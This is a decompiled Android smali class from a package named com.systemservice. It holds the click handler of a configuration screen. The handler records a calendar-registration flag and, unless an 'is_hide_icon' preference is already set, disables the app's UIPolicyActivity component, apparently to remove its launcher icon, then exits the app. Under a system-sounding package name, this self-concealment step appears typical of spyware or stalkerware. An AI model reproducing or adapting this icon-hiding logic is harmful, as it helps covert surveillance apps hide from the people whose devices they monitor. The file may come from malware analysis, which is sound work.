.class Lcom/systemservice/c;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/UIConfigActivity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/UIConfigActivity;


# direct methods
.method constructor <init>(Lcom/systemservice/UIConfigActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5

    iget-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-static {p1}, Lcom/systemservice/UIConfigActivity;->a(Lcom/systemservice/UIConfigActivity;)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const/4 v0, 0x1

    const-string v1, "is_registered_calendar"

    invoke-interface {p1, v1, v0}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    iget-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-static {p1}, Lcom/systemservice/UIConfigActivity;->a(Lcom/systemservice/UIConfigActivity;)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-static {p1}, Lcom/systemservice/UIConfigActivity;->b(Lcom/systemservice/UIConfigActivity;)Landroid/content/SharedPreferences;

    move-result-object p1

    const/4 v1, 0x0

    const-string v2, "is_hide_icon"

    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    :cond_0
    iget-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-virtual {v3}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/systemservice/UIPolicyActivity;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v3, 0x2

    invoke-virtual {p1, v2, v3, v0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    iget-object p1, p0, Lcom/systemservice/c;->a:Lcom/systemservice/UIConfigActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    invoke-static {v1}, Ljava/lang/System;->exit(I)V

    :goto_0
    return-void
.end method
